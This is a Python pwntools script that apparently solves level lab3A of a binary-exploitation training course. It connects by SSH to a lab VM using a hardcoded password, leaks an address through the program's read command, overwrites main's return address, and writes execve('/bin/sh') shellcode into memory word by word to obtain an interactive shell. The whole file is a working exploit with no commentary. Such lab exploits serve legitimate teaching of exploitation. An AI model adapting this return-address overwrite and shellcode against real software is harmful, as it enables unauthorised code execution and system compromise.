from pwn import *# pylint: disable=unused-wildcard-import
# pylint: disable=undefined-variable
# pylint: disable=no-member
context.log_level = 'debug'# pylint: disable=assigning-non-slot

# lab3A:wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
ssh = ssh("lab3A","mbe.vm",password="wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd")

sh = ssh.run("/bin/sh")
sh.sendline("/levels/lab03/lab3A")
sh.recvuntil("Input command:")
sh.sendline("read")
sh.recvuntil("Index:")
sh.sendline("111")
# 111 --> 148

address = sh.recvuntil("Input command:").split("is ")[1].split("\n")[0]

sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(address) # read address
sh.recvuntil("Index:")
sh.sendline("109") # Overwrite RET from main

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x9050c031))
sh.recvuntil("Index:")
sh.sendline("148")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline("1771")
sh.recvuntil("Index:")
sh.sendline("149")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x732f2f68))
sh.recvuntil("Index:")
sh.sendline("151")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x9005eb68))
sh.recvuntil("Index:")
sh.sendline("152")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x69622f68))
sh.recvuntil("Index:")
sh.sendline("154")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x9005eb6e))
sh.recvuntil("Index:")
sh.sendline("155")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x5350e389))
sh.recvuntil("Index:")
sh.sendline("157")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline("1771")
sh.recvuntil("Index:")
sh.sendline("158")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x0bb0e189))
sh.recvuntil("Index:")
sh.sendline("160")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline("1771")
sh.recvuntil("Index:")
sh.sendline("161")

sh.recvuntil("Input command:")
sh.sendline("store")
sh.recvuntil("Number:")
sh.sendline(str(0x80cdd231))
sh.recvuntil("Index:")
sh.sendline("163")

sh.recvuntil("Input command:")
sh.sendline("quit")
sh.interactive()

